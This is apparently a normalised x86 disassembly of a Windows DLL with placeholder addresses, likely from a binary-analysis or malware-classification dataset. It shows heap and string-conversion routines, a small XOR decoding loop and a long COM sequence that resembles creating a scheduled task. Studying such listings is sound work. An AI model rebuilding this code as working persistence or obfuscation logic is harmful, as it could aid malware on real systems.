lea edx [ ebp - 0x8d0 ]
push edx
mov eax edx
push eax
mov ecx edx
push ecx
push 0x0
push 0x1
push ebx
lea eax [ ebp - 0x7d0 ]
mov [ ebp - 0x4 ] 0xd
call sub_10066ff0
test eax eax
jne r-xdata
lea eax [ ebp - 0x8d0 ]
push eax
mov ecx eax
push ecx
mov edx eax
push edx
push 0x0
push 0x1
push ebx
lea eax [ ebp - 0x5c8 ]
call sub_10066ff0
test eax eax
lea eax [ ebp - 0x7ec ]
push eax
jne r-xdata
lea eax [ ebp - 0x808 ]
push eax
lea edx [ ebp - 0x50 ]
call sub_100453a0
lea edx [ ebp - 0x7d0 ]
push edx
lea ecx [ ebp - 0x824 ]
call sub_10054d00
push eax
lea edx [ ebp - 0x1c ]
lea esi [ ebp - 0x840 ]
mov [ ebp - 0x4 ] 0xe
call sub_1001ccb0
add esp 0x4
push eax
lea ecx [ ebp - 0x808 ]
mov [ ebp - 0x4 ] 0xf
call sub_100649e0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x824 ]
mov [ ebp - 0x4 ] 0xd
call sub_10019100
jmp r-xdata
lea edx [ ebp - 0x28 ]
call sub_100453a0
lea edx [ ebp - 0x5c8 ]
call sub_100453a0
mov eax [ ebp - 0x92c ]
lea ecx [ ebp - 0x5c8 ]
push ecx
lea edx [ ebp - 0x168 ]
push edx
call sub_1006d8b0
jmp r-xdata
mov edx edi
mov edx [ edi ]
jmp r-xdata
lea ecx [ ebp - 0x3c0 ]
push ecx
lea ecx [ ebp - 0x894 ]
call sub_10054d00
push eax
lea edx [ ebp - 0x930 ]
lea esi [ ebp - 0x878 ]
mov [ ebp - 0x4 ] 0x10
call sub_1001ccb0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x808 ]
lea esi [ ebp - 0x8b0 ]
mov [ ebp - 0x4 ] 0x11
call sub_10038800
mov edi eax
lea edx [ ebp - 0x3c0 ]
push edx
lea ecx [ ebp - 0x85c ]
mov [ ebp - 0x4 ] 0x12
call sub_10054d00
push eax
lea edx [ ebp - 0x930 ]
lea esi [ ebp - 0x8cc ]
mov [ ebp - 0x4 ] 0x13
call sub_1001ccb0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x7ec ]
lea esi [ ebp - 0x840 ]
mov [ ebp - 0x4 ] 0x14
call sub_10038800
mov ecx 0x8
mov [ ebp - 0x4 ] 0x15
cmp [ edi + 0x14 ] ecx
jb r-xdata
lea ecx [ ebp - 0x824 ]
push ecx
mov ecx eax
call sub_10067650
add esp 0x4
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x16
call sub_100649e0
lea ecx [ ebp - 0x824 ]
call sub_10019100
lea ecx [ ebp - 0x840 ]
call sub_10019100
lea ecx [ ebp - 0x8cc ]
call sub_10019100
lea ecx [ ebp - 0x85c ]
call sub_10019100
lea ecx [ ebp - 0x8b0 ]
call sub_10019100
lea ecx [ ebp - 0x878 ]
call sub_10019100
lea ecx [ ebp - 0x894 ]
call sub_10019100
push ebx
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0x808 ]
call sub_10019100
lea ecx [ ebp - 0x7ec ]
call sub_10019100
mov eax [ eax ]
cmp [ eax + 0x14 ] ecx
jb r-xdata
sub_10026122
push 0x4
mov eax sub_1008554e
call sub_100624bc
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_10059f54
mov eax esi
call sub_10013ab8
retn 0x8
sub_10026155
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1000b33e
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10035d06
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_10046ed7
pop ecx
call sub_1006299d
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_1006299d
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10053281
pop ecx
mov [ esi ] eax
push esi
call sub_10046ed7
pop ecx
test eax eax
je r-xdata
call sub_1006299d
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10053281
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_10026210
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10026251
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001f709
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_100262f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008718e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ edi ] al
mov esi [ edx + 0x4 ]
lea ecx [ edi + 0x4 ]
mov [ ecx ] esi
mov [ edi + 0x1c ] 0xf
mov [ edi + 0x18 ] eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] edx
mov [ edi + 0x8 ] al
mov [ ebp - 0x4 ] eax
mov [ edi + 0x24 ] eax
mov [ edi + 0x28 ] eax
mov edx [ edx + 0x14 ]
mov [ edi + 0x2c ] edx
mov [ edi + 0x30 ] eax
mov [ edi + 0x34 ] eax
mov [ edi + 0x38 ] eax
mov [ edi + 0x3c ] eax
push 0x4
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10006b30
add esp 0x4
push eax
lea ecx [ edi + 0x8 ]
mov [ ebp - 0x4 ] 0x2
call sub_10021bf0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ edi + 0x2c ]
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi + 0x24 ] eax
mov eax [ ebp - 0x30 ]
push edi
mov [ edi ] 0x1
call sub_10068c90
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
sub_100263d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100870fb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x170
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
push ebx
push ebx
mov esi ecx
mov [ ebp - 0xd4 ] eax
call [ CoInitializeEx@IAT ]
test eax eax
js r-xdata
mov eax 0x1
jmp r-xdata
push ebx
push ebx
push ebx
push 0x3
push 0x6
push ebx
push ebx
push 0xffffffff
push ebx
call [ CoInitializeSecurity@IAT ]
cmp eax ebx
jge r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
xor ecx ecx
mov eax esi
mov [ ebp - 0xa4 ] 0x7
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] cx
lea edx [ eax + 0x2 ]
cmp eax 0x80010119
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0xb8 ]
call sub_1005ddc0
lea edx [ ebp - 0xcc ]
push edx
push r--data
push 0x1
push ebx
mov [ ebp - 0x4 ] ebx
push r--data
mov [ ebp - 0xcc ] ebx
call [ CoCreateInstance@IAT ]
cmp eax ebx
jge r-xdata
call [ CoUninitialize@IAT ]
mov esi [ VariantInit@IAT ]
lea ecx [ ebp - 0x144 ]
push ecx
call esi
mov edx [ ebp - 0x140 ]
mov eax [ ebp - 0x13c ]
mov ecx [ ebp - 0x138 ]
mov edi [ ebp - 0x144 ]
mov [ ebp - 0x128 ] edx
lea edx [ ebp - 0x154 ]
push edx
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] ecx
call esi
mov ecx [ ebp - 0x150 ]
mov eax [ ebp - 0x154 ]
mov edx [ ebp - 0x14c ]
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x10c ] eax
mov eax [ ebp - 0x148 ]
lea ecx [ ebp - 0x164 ]
push ecx
mov [ ebp - 0x104 ] edx
mov [ ebp - 0x100 ] eax
call esi
mov eax [ ebp - 0x160 ]
mov edx [ ebp - 0x164 ]
mov ecx [ ebp - 0x15c ]
mov [ ebp - 0xf0 ] eax
mov [ ebp - 0xf4 ] edx
mov edx [ ebp - 0x158 ]
lea eax [ ebp - 0x17c ]
push eax
mov [ ebp - 0xec ] ecx
mov [ ebp - 0xe8 ] edx
call esi
mov [ ebp - 0x4 ] 0x4
mov esi [ ebp - 0x128 ]
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x124 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x120 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x10c ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x108 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x104 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x100 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0xf4 ]
mov ecx [ ebp - 0xcc ]
mov edx [ ecx ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0xf0 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0xec ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0xe8 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x17c ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x178 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x174 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x170 ]
mov [ eax + 0xc ] esi
mov eax [ edx + 0x28 ]
push ecx
call eax
mov esi [ VariantClear@IAT ]
lea ecx [ ebp - 0x17c ]
push ecx
mov edi eax
call esi
lea edx [ ebp - 0x164 ]
push edx
call esi
lea eax [ ebp - 0x154 ]
push eax
call esi
lea ecx [ ebp - 0x144 ]
push ecx
mov [ ebp - 0x4 ] bl
call esi
cmp edi ebx
jge r-xdata
call [ CoUninitialize@IAT ]
cmp [ ebp - 0xa4 ] 0x8
jb r-xdata
lea edx [ ebp - 0x168 ]
mov eax 0x5
mov [ ebp - 0xc0 ] ebx
call sub_10012e10
lea edx [ ebp - 0xc4 ]
push edx
lea edi [ ebp - 0x168 ]
call sub_1006f670
mov [ ebp - 0x4 ] 0x5
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xcc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
call [ CoUninitialize@IAT ]
cmp [ ebp - 0xa4 ] 0x8
jb r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_100187af
add esp 0x4
mov eax 0x1
jmp r-xdata
lea eax [ ebp - 0xc4 ]
push eax
mov edi r--data
call sub_1006f670
mov [ ebp - 0x4 ] 0x6
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ ebp - 0xcc ]
mov edx [ ecx ]
lea edi [ ebp - 0xc0 ]
push edi
push eax
mov eax [ edx + 0x1c ]
push ecx
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] bl
call sub_1004d6c0
cmp [ ebp - 0xc8 ] ebx
jge r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0xf8 ]
mov [ ebp - 0xf8 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0xc0 ]
jmp r-xdata
mov eax [ ebp - 0xc0 ]
mov edx [ eax ]
push ebx
push ecx
push eax
mov eax [ edx + 0x3c ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_1004d6c0
mov eax [ ebp - 0xcc ]
lea edx [ ebp - 0xbc ]
push edx
mov [ ebp - 0xbc ] ebx
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov edi eax
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jge r-xdata
mov eax [ ebp - 0xc0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xbc ]
jmp r-xdata
mov eax [ ebp - 0xf8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x28 ]
push r--data
push eax
call edx
mov edi eax
mov eax [ ebp - 0xf8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
lea ecx [ ebp - 0xb8 ]
call sub_10019100
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0xd8 ]
mov [ ebp - 0xd8 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x3c ]
call eax
cmp eax ebx
jl r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x7
call sub_10012e10
lea eax [ ebp - 0xc4 ]
push eax
mov edi edx
call sub_1006f670
mov [ ebp - 0x4 ] 0x7
mov eax [ eax ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0x110 ]
mov [ ebp - 0x110 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x2c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0xd8 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x20 ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_1004d6c0
mov eax [ ebp - 0xd8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x38 ]
push 0x2
push eax
call edx
mov eax [ ebp - 0xd8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x48 ]
push 0x1
push eax
call edx
mov edi eax
mov eax [ ebp - 0xd8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x110 ]
mov ecx [ eax ]
mov edx [ ecx + 0x58 ]
push 0xffffffff
push eax
call edx
mov edi eax
mov eax [ ebp - 0x110 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0x118 ]
mov [ ebp - 0x118 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0x118 ]
lea edx [ ebp - 0x114 ]
push edx
mov [ ebp - 0x114 ] ebx
mov ecx [ eax ]
push 0x9
push eax
mov eax [ ecx + 0x28 ]
call eax
mov edi eax
mov eax [ ebp - 0x118 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x114 ]
lea edx [ ebp - 0xd0 ]
push edx
mov [ ebp - 0xd0 ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov edi eax
mov eax [ ebp - 0x114 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x8
call sub_10012e10
lea eax [ ebp - 0xc4 ]
push eax
mov edi edx
call sub_1006f670
mov [ ebp - 0x4 ] 0x8
mov eax [ eax ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0xd0 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x24 ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_1004d6c0
lea edx [ ebp - 0x74 ]
mov eax 0x6
call sub_10012e10
lea ecx [ ebp - 0xc4 ]
push ecx
mov edi edx
call sub_1006f670
mov [ ebp - 0x4 ] 0x9
mov eax [ eax ]
cmp eax ebx
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xd0 ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x3c ]
push ecx
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_1004d6c0
lea edx [ ebp - 0x9c ]
mov eax 0x2
call sub_10012e10
lea ecx [ ebp - 0xc4 ]
push ecx
mov edi edx
call sub_1006f670
mov [ ebp - 0x4 ] 0xa
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0xe0 ]
mov [ ebp - 0xe0 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
js r-xdata
mov ecx [ ebp - 0xd0 ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x44 ]
push ecx
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_1004d6c0
lea edx [ ebp - 0x20 ]
xor eax eax
call sub_10012e10
mov eax [ ebp - 0xd0 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov edi eax
mov eax [ ebp - 0xd0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0xe0 ]
lea edx [ ebp - 0xfc ]
push edx
mov [ ebp - 0xfc ] ebx
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x30 ]
call eax
mov edi eax
mov eax [ ebp - 0xe0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0xfc ]
lea edx [ ebp - 0xdc ]
push edx
mov [ ebp - 0xdc ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov edi eax
mov eax [ ebp - 0xfc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
cmp [ ebp - 0xa4 ] 0x8
mov edi [ ebp - 0xb8 ]
jae r-xdata
lea eax [ ebp - 0xc4 ]
push eax
call sub_1006f670
mov [ ebp - 0x4 ] 0xb
mov eax [ eax ]
cmp eax ebx
je r-xdata
lea edi [ ebp - 0xb8 ]
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov edi [ ebp - 0xd4 ]
lea eax [ ebp - 0xd4 ]
push eax
call sub_1006f670
mov [ ebp - 0x4 ] 0xc
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xdc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0xdc ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x2c ]
push ecx
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] bl
call sub_1004d6c0
cmp [ ebp - 0xc8 ] ebx
jge r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax 0x8
push r--data
mov [ ebp - 0x130 ] ebx
mov [ ebp - 0x164 ] ax
call [ SysAllocString@IAT ]
mov [ ebp - 0x15c ] eax
cmp eax ebx
jne r-xdata
mov eax [ ebp - 0xdc ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x34 ]
call eax
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] bl
call sub_1004d6c0
mov eax [ ebp - 0xdc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ ebp - 0xc8 ] ebx
jl r-xdata
mov ecx [ ebp - 0x164 ]
mov edx [ ebp - 0x160 ]
mov edi [ VariantInit@IAT ]
mov [ ebp - 0xf4 ] ecx
mov [ ebp - 0xec ] eax
mov eax [ ebp - 0x158 ]
lea ecx [ ebp - 0x154 ]
push ecx
mov [ ebp - 0xf0 ] edx
mov [ ebp - 0xe8 ] eax
call edi
mov eax [ ebp - 0x150 ]
mov edx [ ebp - 0x154 ]
mov ecx [ ebp - 0x14c ]
mov [ ebp - 0x108 ] eax
mov [ ebp - 0x10c ] edx
mov edx [ ebp - 0x148 ]
lea eax [ ebp - 0x144 ]
push eax
mov [ ebp - 0x104 ] ecx
mov [ ebp - 0x100 ] edx
call edi
mov [ ebp - 0x4 ] 0xf
mov edx [ ebp - 0x140 ]
mov ecx [ ebp - 0x144 ]
mov eax [ ebp - 0x13c ]
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x12c ] ecx
mov ecx [ ebp - 0x138 ]
lea edx [ ebp - 0xd4 ]
push edx
mov edi r--data
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] ecx
call sub_1006f670
mov [ ebp - 0x4 ] 0x10
mov eax [ eax ]
cmp eax ebx
je r-xdata
push 0x8007000e
call sub_10035950
mov [ ebp - 0xc8 ] ebx
mov eax [ eax ]
mov [ ebp - 0xc8 ] eax
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
call edx
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x130 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
lea ecx [ ebp - 0xb8 ]
call sub_10019100
xor eax eax
mov edx [ eax ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0xbc ]
jmp r-xdata
mov edi [ ebp - 0xf4 ]
lea eax [ ebp - 0x130 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov edi [ ebp - 0xf0 ]
mov [ eax + 0x4 ] edi
mov edi [ ebp - 0xec ]
mov [ eax + 0x8 ] edi
mov edi [ ebp - 0xe8 ]
mov [ eax + 0xc ] edi
mov edi [ ebp - 0x10c ]
push 0x2
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov edi [ ebp - 0x108 ]
mov [ eax + 0x4 ] edi
mov edi [ ebp - 0x104 ]
mov ecx [ ebp - 0xc0 ]
mov [ eax + 0x8 ] edi
mov edi [ ebp - 0x100 ]
mov edx [ ecx ]
mov [ eax + 0xc ] edi
mov edi [ ebp - 0x12c ]
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov edi [ ebp - 0x128 ]
mov [ eax + 0x4 ] edi
mov edi [ ebp - 0x124 ]
mov [ eax + 0x8 ] edi
mov edi [ ebp - 0x120 ]
mov [ eax + 0xc ] edi
mov eax [ ebp - 0xbc ]
push 0x6
push eax
mov eax [ ebp - 0xc8 ]
push eax
push ecx
mov ecx [ edx + 0x44 ]
call ecx
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0xc8 ] eax
call sub_1004d6c0
lea edx [ ebp - 0x144 ]
push edx
call esi
lea eax [ ebp - 0x154 ]
push eax
call esi
lea ecx [ ebp - 0x164 ]
push ecx
mov [ ebp - 0x4 ] bl
call esi
mov eax [ ebp - 0xc0 ]
push eax
cmp [ ebp - 0xc8 ] ebx
jge r-xdata
sub_10026e29
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
test eax eax
jne r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
call sub_10062fa9
mov esi [ eax + 0x8 ]
call sub_100190d3
mov edi eax
jmp r-xdata
and [ ebp + 0x14 ] 0x0
push edi
call sub_100698f8
pop ecx
lea ecx [ ebp + 0x14 ]
push ecx
push 0x0
push eax
call sub_10038b8c
pop ecx
push eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x0
push edi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov ax [ ebp + 0xc ]
mov ecx 0xff
cmp ax cx
ja r-xdata
test esi esi
jne r-xdata
call sub_1006299d
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_10026eb0
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
call sub_10062fa9
mov esi [ eax + 0x8 ]
call sub_100190d3
jmp r-xdata
xor ecx ecx
mov [ eax ] cx
push [ ebp + 0xc ]
call sub_100698f8
mov esi [ ebp + 0x14 ]
cmp [ esi ] 0x0
pop ecx
mov ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0xc ] eax
test esi esi
jne r-xdata
test ebx ebx
jne r-xdata
mov al [ edi ]
push ebx
mov [ esi + 0x1 ] al
call sub_10038b8c
pop ecx
cmp eax 0x1
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
movzx ecx [ edi ]
mov [ eax ] cx
movzx eax [ edi ]
mov ecx [ ebx + 0x4 ]
movzx eax [ ecx + eax + 0x1d ]
and eax 0x4
call sub_1000447b
movzx ecx [ edi ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
and [ esi ] 0x0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x2
push esi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_10038b8c
pop ecx
cmp [ ebp + 0x10 ] eax
jae r-xdata
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
push ebx
call sub_10038b8c
pop ecx
cmp eax 0x1
jle r-xdata
mov al [ edi ]
push 0xfffffffe
mov [ esi ] al
pop eax
jmp r-xdata
call sub_1006299d
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push ebx
call sub_10038b8c
pop ecx
push eax
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_10038b8c
pop ecx
jmp r-xdata
jmp r-xdata
sub_10027023
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
